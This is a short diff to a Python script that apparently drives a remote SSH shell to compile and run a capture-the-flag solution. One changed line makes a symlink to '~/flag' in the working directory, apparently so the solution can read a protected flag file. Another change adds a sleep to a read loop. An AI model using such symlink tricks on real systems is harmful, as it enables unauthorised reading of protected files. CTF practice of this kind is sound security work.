@@ -22,7 +22,7 @@ print(" --- compiling solution ---")
 channel = client.invoke_shell()
 stdin = channel.makefile('wb')
 stdout = channel.makefile('rb')
-stdin.write("cd /tmp/k280_input2 && gcc -o solve solution.c && echo -e \"compiled\\n\"".encode('utf-8'))
+stdin.write("cd /tmp/k280_input2 && cp -s ~/flag flag && echo -e \"copied symlink to flag\\n\" && gcc -o solve solution.c && echo -e \"compiled\\n\"".encode('utf-8'))
 stdin.flush()
 
 while 'compiled' not in alldata:
@@ -66,6 +66,8 @@ while True:
         data = dec(stdout.read(nbytes))
         print(data, end = '')
         alldata += data
+    else:
+        time.sleep(0.1)
 
 print("--- done ---")
 
